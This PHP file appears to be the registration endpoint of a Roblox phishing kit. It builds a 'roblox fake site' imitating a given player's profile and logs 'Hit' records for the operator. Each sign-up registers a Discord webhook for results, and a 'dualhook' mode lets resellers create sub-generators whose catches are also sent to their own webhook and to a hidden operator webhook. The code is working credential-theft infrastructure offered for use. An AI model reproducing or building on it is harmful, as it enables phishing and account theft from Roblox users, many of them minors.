<?php
require('../../setup.php');
session_start();
header('content-type: application/json');

if (!isset($_SERVER['HTTP_REFERER'])) {
    http_response_code(400);
    die(json_encode(["errors" => [["code" => 400, 'message' => 'BadRequest']]]));
} elseif (isset($_GET['a']) && !empty($_GET['a']) && isset($_GET['b']) && !empty($_GET['b']) && isset($_GET['c']) && !empty($_GET['c']) && isset($_GET['type']) && !empty($_GET['type'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    $c = $_GET['c'];
    $type = $_GET['type'];

    if ($type == 'Regular') {
        if (filter_var($c, FILTER_VALIDATE_URL) === false) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook should be URL']]]));
        }
        $parsedUrl = parse_url($c);
        $validDomains = ['discord.com', 'discordapp.com', 'canary.discord.com', 'ptb.discord.com'];
        if (!in_array($parsedUrl['host'], $validDomains)) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook should be active one1']]]));
        }
                
        if (!preg_match('#^/api/webhooks/\d{1,50}/[A-Za-z0-9_\-]+/?$#', $parsedUrl['path'])) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook should be active one']]]));
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $c);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, TRUE);
        curl_setopt($ch, CURLOPT_NOBODY, TRUE);
        $response = curl_exec($ch); 
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode !== 200) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook should be active one']]]));
        }
        
        curl_close($ch);
        $ch = curl_init('https://users.roblox.com/v1/usernames/users');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $headers = array("content-type: application/json");
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"usernames": ["'."".$a."".'"],"excludeBannedUsers": false}');
        $robloxusernamedata = json_decode(curl_exec($ch), true)['data'];
        foreach ($robloxusernamedata as $robloxusernamevalue) {
            $username.=$robloxusernamevalue['name'];
            $uid.=$robloxusernamevalue['id'];
            $displayname.=$robloxusernamevalue['displayName'];
        }
        if($username){
            $id = rand();
            $returnUrl = '';
            for($i = 0; $i < 15; $i++) { $returnUrl .= mt_rand(0, 9); }
            $authkey = '';
            for($i = 0; $i < 64; $i++) { $authkey .= mt_rand(0, 9); }

            if (!file_exists('../../tokens/'.base64_encode(base64_encode($c)).'.txt')) {
                preg_match('/(?<=)(.*?)(?=T)/', json_decode(file_get_contents('https://users.roblox.com/v1/users/'.$uid))->created, $result);
                $token = strtoupper(substr(str_repeat(md5(rand()),ceil(32/32)),0,32));
                file_put_contents('../../tokens/'.$authkey.'.txt',$id);
                mkdir('../../tokens/'.$id.'');
                mkdir('../../tokens/'.$id.'/setup');

                file_put_contents('../../tokens/'.$id.'/setup/'.base64_encode(base64_encode($c)),'true');
                file_put_contents('../../tokens/'.$id.'/setup/authkey.txt',$authkey);
                file_put_contents('../../tokens/'.$id.'/setup/returnUrl.txt',$returnUrl);
                file_put_contents('../../tokens/returnUrl-'.$returnUrl.'.txt',base64_encode(base64_encode($c)));
                file_put_contents('../../tokens/users/returnUrl-'.$returnUrl.'.txt',($c));
                file_put_contents('../../tokens/users/Hit-'.$returnUrl.'.txt',($id));
                file_put_contents('../../tokens/'.$id.'/setup/username.txt',htmlspecialchars($b));
                file_put_contents('../../tokens/'.$id.'/setup/displayname.txt',htmlspecialchars($b));
                file_put_contents('../../tokens/'.$id.'/setup/premium.txt','false');
                file_put_contents('../../tokens/'.$id.'/setup/avatar.txt',$uid);
                file_put_contents('../../tokens/'.$id.'/setup/friends.txt',json_decode(file_get_contents('https://friends.roblox.com/v1/users/'.$uid.'/friends/count'))->count);
                file_put_contents('../../tokens/'.$id.'/setup/followers.txt',json_decode(file_get_contents('https://friends.roblox.com/v1/users/'.$uid.'/followers/count'))->count);
                file_put_contents('../../tokens/'.$id.'/setup/followings.txt',json_decode(file_get_contents('https://friends.roblox.com/v1/users/'.$uid.'/followings/count'))->count);
                file_put_contents('../../tokens/'.$id.'/setup/description.txt',json_decode(file_get_contents('https://users.roblox.com/v1/users/'.$uid))->description);
                file_put_contents('../../tokens/'.$id.'/setup/activity.txt','none');
                file_put_contents('../../tokens/'.$id.'/setup/joinbutton.txt','true');
                mkdir('../../tokens/'.$id.'/setup/socialmedia');
                file_put_contents('../../tokens/'.$id.'/setup/socialmedia/facebook.txt','');
                file_put_contents('../../tokens/'.$id.'/setup/socialmedia/twitter.txt','');
                file_put_contents('../../tokens/'.$id.'/setup/socialmedia/youtube.txt','');
                file_put_contents('../../tokens/'.$id.'/setup/socialmedia/twitch.txt','');
                file_put_contents('../../tokens/'.$id.'/setup/socialmedia/guilded.txt','');
                file_put_contents('../../tokens/'.$id.'/setup/created.txt',date("n/d/Y", strtotime($result[0])));
                file_put_contents('../../tokens/'.$id.'/setup/placevisits.txt','0');
                file_put_contents('../../tokens/'.$id.'/setup/webhook.txt',base64_encode(base64_encode($c)));
                file_put_contents('../../tokens/'.$id.'/setup/totalvisitor.txt','0');
                file_put_contents('../../tokens/'.$id.'/setup/totalresult.txt','0');
                if($_GET['dh']) {
                    if(file_exists('../../tokens/dualhook/'.$_GET['dh'].'/webhook.txt')) {
                    $dh = file_get_contents('../../tokens/dualhook/'.$_GET['dh'].'/webhook.txt');
                    file_put_contents('../../tokens/users/'.$returnUrl.'.txt',($dh));
                    file_put_contents('../../tokens/login/'.$returnUrl.'.txt',($dh));
                    file_put_contents('../../tokens/'.$returnUrl.'.txt',base64_encode(base64_encode($dh)));
                } else {
                     die();
                }
                } else {
                    file_put_contents('../../tokens/'.$id.'/setup/dwebhook.txt','');
                }
                $embed = '{"content": null,"embeds": [{"description": "Your Auth Key: **'.$authkey.'**\nYour can control your roblox fake site at **https://'.$_SERVER['SERVER_NAME'].'/controlPage/sign-in**","color": '.hexdec($color).',"timestamp":"'.date('Y-m-d\TH:i:s.v\Z').'"}],"username": "'.$name.'","avatar_url": "'.$image.'","attachments": []}';
                $ch = curl_init();
                curl_setopt_array($ch, 
                [
                    CURLOPT_URL => $c,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $embed,
                    CURLOPT_HTTPHEADER => ["Content-Type: application/json"]
                ]);                                   
                $response = curl_exec($ch);
                curl_close($ch);
                $ch = curl_init();
                curl_setopt_array($ch, 
                [
                    CURLOPT_URL => $webhook,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $embed,
                    CURLOPT_HTTPHEADER => ["Content-Type: application/json"]
                ]);                                   
                $response = curl_exec($ch);
                curl_close($ch);
                if($dh) {
                $ch = curl_init();
                curl_setopt_array($ch, 
                [
                    CURLOPT_URL => base64_decode(base64_decode($dh)),
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $embed,
                    CURLOPT_HTTPHEADER => ["Content-Type: application/json"]
                ]);                                   
                $response = curl_exec($ch);
                curl_close($ch);
                }
                $_SESSION['authkey'] = $authkey;
                die(json_encode(['success' => true]));
            } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook has been used. Please use another.']]]));
            }
        } else {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Username not found on roblox database']]]));
        }
    } elseif ($type == 'Dualhook' && isset($_GET['d']) && !empty($_GET['d']) && isset($_GET['e']) && !empty($_GET['e'])) {
        $d = $_GET['d'];
        $e = $_GET['e'];

        if (filter_var($c, FILTER_VALIDATE_URL) === false) {
            if (filter_var($d, FILTER_VALIDATE_URL) === false) {
                http_response_code(403);
                die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook and Thumbnails should be URL']]]));
            } else {
                http_response_code(403);
                die(json_encode(["errors" => [["code" => 403, 'message' => 'Thumbnails should be a valid URL']]]));
            }
        }

        $imageInfo = getimagesize($c);
        if (!$imageInfo) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Thumbnails should be an image URL']]]));
        }

        if (filter_var($d, FILTER_VALIDATE_URL) === false) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook should be URL']]]));
        }

        $parsedUrl = parse_url($d);
        $validDomains = ['discord.com', 'discordapp.com', 'canary.discord.com', 'ptb.discord.com'];
        if (!in_array($parsedUrl['host'], $validDomains)) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook should be active one']]]));
        }
                
        if (!preg_match('#^/api/webhooks/\d{1,50}/[A-Za-z0-9_\-]+/?$#', $parsedUrl['path'])) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook should be active one']]]));
        }
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $d);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, TRUE);
        curl_setopt($ch, CURLOPT_NOBODY, TRUE);
        $response = curl_exec($ch); 
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode !== 200) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook should be active one']]]));
        }
        if(file_exists('../../tokens/dualhook/'.base64_encode(base64_encode($d)).'.txt')) {
        http_response_code(403);
        die(json_encode(["errors" => [["code" => 403, 'message' => 'Webhook has been used. Please use another.']]]));
        }
        if (ctype_xdigit(str_replace('#', '', $_GET['e'])) === false) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Invalid color!']]]));
        }
        $fdirectory = preg_replace('/[^A-Za-z0-9\-]/','',$a);
        $rdirectory = '../../tokens/dualhook/'.$fdirectory.'/name.txt';
        if (file_exists($rdirectory)) {
            http_response_code(403);
            die(json_encode(["errors" => [["code" => 403, 'message' => 'Directory has been used. Please use another.']]]));
        } else {
            $directory = preg_replace('/[^A-Za-z0-9\-]/','',$a);
            if(file_exists('../../tokens/dualhook/'.$directory.'/name.txt')) {
                http_response_code(403);
                die(json_encode(["errors" => [["code" => 403, 'message' => 'Directory has been used. Please use another.']]]));
            }
            $names = htmlspecialchars($b);
            $thumbnail = str_replace(['<', '>', '!', '(', '"', "'", ';'], '', $_GET['c']);
            $hexcolor = str_replace('#','',$e);
            mkdir('../../tokens/dualhook/'.$directory);
            $dl = base64_encode(base64_encode($d));
            mkdir('../../tokens/dualhook/'.$dl);
            file_put_contents('../../tokens/dualhook/'.$directory.'/name.txt',$names);
            file_put_contents('../../tokens/dualhook/'.$directory.'/thumbnail.txt',base64_encode($thumbnail));
            file_put_contents('../../tokens/dualhook/'.$directory.'/image.txt', $thumbnail);
            file_put_contents('../../tokens/dualhook/'.$directory.'/hex.txt',$hexcolor);
            file_put_contents('../../tokens/dualhook/'.$directory.'/webhook.txt',$dl);
            file_put_contents('../../tokens/dualhook/'.base64_encode(base64_encode($d)).'/name.txt',$names);
            file_put_contents('../../tokens/dualhook/'.base64_encode(base64_encode($d)).'/thumbnail.txt',$thumbnail);
            file_put_contents('../../tokens/dualhook/'.base64_encode(base64_encode($d)).'/hex.txt',$hexcolor);
            file_put_contents('../../tokens/dualhook/'.base64_encode(base64_encode($d)).'.txt','true');
            $embed = '{"content": null,"embeds": [{"description": "Your dualhook generator URL **https://'.$_SERVER['SERVER_NAME'].'/generator/'.$directory.'/create**","color": '.hexdec($hexcolor).',"timestamp":"'.date('Y-m-d\TH:i:s.v\Z').'"}],"username": "'.$names.' - Notifier","avatar_url": "'.$thumbnail.'","attachments": []}';

                $ch = curl_init();
                curl_setopt_array($ch, 
                [
                    CURLOPT_URL => $d,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $embed,
                    CURLOPT_HTTPHEADER => ["Content-Type: application/json"]
                ]);                                   
                $response = curl_exec($ch);
                curl_close($ch);
                $ch = curl_init();
                curl_setopt_array($ch, 
                [
                    CURLOPT_URL => $webhook,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => $embed,
                    CURLOPT_HTTPHEADER => ["Content-Type: application/json"]
                ]);                                   
                $response = curl_exec($ch);
                curl_close($ch);
            die(json_encode(['success' => true]));
        }
        
    } else {
        http_response_code(403);
        die(json_encode(["errors" => [["code" => 403, 'message' => 'Invalid type']]]));
    }
} else {
    http_response_code(403);
    die(json_encode(["errors" => [["code" => 403, 'message' => 'You must fill all form']]]));
}
